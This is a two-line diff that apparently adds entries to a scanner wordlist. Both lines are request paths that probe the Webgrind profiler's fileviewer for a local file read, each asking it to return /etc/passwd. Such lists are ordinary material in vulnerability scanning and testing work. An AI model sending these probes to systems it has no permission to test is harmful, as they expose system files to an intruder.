@@ -1,0 +1,2 @@
+/index.php?op=fileviewer&file=/etc/passwd
+/webgrind/index.php?op=fileviewer&file=/etc/passwd
